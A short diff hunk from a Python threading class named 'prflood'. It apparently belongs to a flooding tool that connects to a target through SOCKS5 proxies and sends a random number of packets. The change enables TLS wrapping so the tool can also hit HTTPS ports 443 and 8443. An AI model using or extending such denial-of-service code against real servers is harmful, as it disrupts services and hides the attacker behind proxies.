@@ -354,8 +354,8 @@ class prflood(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s.settimeout(timeout)
     s.connect((target,port))
-    #if ((port==443) or (port==8443)):
-    #  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+    if ((port==443) or (port==8443)):
+      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     for fg in range(random.randint(packs2,packs1)):
      if stop==True:
       break
